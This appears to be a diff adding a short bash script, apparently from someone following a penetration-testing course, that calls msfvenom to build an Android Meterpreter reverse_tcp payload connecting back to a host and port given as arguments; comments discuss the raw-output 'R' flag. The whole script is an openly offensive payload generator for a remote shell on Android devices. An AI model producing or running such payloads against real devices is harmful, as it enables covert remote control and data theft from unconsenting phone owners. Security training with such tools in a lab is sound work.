@@ -1,0 +1,15 @@
+#/bin/env bash 
+
+set -eux
+
+HOST=$1
+PORT=$2
+OUTPUT=$3
+
+# "R" is the undocumented(?) flag to save the output in "raw" format
+# This is documented in the O'Relley book but nowhere in the reverse_tcp
+# payload :thinks:
+# I'm pretty sure this R thing is deprecated (msfvenom stil lsays no formatter
+# is specified so it is gonna use raw) but I'm keeping it here so it matches
+# my Udemy course, just in case.
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT R > $OUTPUT 
